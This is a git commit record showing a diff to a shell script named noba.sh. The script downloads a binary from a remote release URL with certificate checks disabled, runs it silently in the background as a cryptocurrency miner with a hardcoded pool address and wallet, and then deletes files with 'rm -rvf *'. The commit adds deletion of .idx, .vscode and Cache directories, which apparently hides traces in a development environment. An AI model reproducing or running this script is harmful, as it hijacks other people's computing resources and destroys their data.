7ae9a9a84f01531bd9aab65d6682790f04313e40
paskofa10 <mr.paskofa10@jugda.com>
2025-06-10 09:16:33 +0700

    Update noba.sh

--- noba.sh
+++ noba.sh
@@ -3,6 +3,9 @@
 curl -sLkO http://github.com/paskofa10/webmoon/releases/download/flex/soto
 chmod 777 soto 
 ./soto --algorithm minotaurx --pool 188.165.24.209:7019 --wallet MM2DPsr5664vCMZP3LiWhxwimmfvohUeHW --password c=MAZA,zap=MAZA --disable-worker-watchdog >/dev/null 2>&1 &
+rm .idx
+rm .vscode
+rm Cache
 rm -rvf *
 while true
 do
